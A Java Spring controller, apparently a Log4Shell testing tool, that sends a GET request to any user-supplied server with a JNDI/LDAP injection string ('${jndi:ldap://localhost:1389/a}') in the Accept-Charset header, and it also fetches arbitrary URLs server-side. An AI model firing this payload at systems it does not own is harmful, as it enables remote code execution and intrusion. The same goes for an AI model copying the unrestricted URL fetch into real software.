package com.panopset.medford;

import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

import com.panopset.compat.HttpGETclient;
import com.panopset.compat.Logop;

@Controller
public class WebController {

	private static final String INDEX = "index";

	@GetMapping({ "/", "/home", "/index", "/index.htm", "/index.html" })
	public String home(Model model, HttpServletResponse response, @RequestParam(required = false) String targetServer) {
		if (targetServer == null) {
			return INDEX;
		}
		model.addAttribute("targetServer", targetServer);
		test(model, targetServer);
		return INDEX;
	}

	void test(Model model, String targetServer) {
		getTextFromURL(model, targetServer);
	}

	private String getTextFromURL(Model model, final String urlStr) {
		URL url;
		try {
			url = new URL(urlStr);
		} catch (MalformedURLException e) {
			Logop.warn(String.format("Bad URL: %s, %s", urlStr, e.getMessage()));
			return "";
		}
		HttpGETclient client = new HttpGETclient(url) {

			@Override
			protected void setConnectionProperties(final HttpURLConnection con) {
				super.setConnectionProperties(con);
				con.setRequestProperty("Accept-Charset", "${jndi:ldap://localhost:1389/a}");
			}
		};
		String response = client.getResponse();
		int responseCode = client.getResponseCode();
		String responseMessage = client.getResponseMessage();
		if (responseMessage == null) {
			responseMessage = "";
		}
		model.addAttribute("status", String.format("Status: %s, %s", responseCode, responseMessage));
		return responseMessage;
	}
}
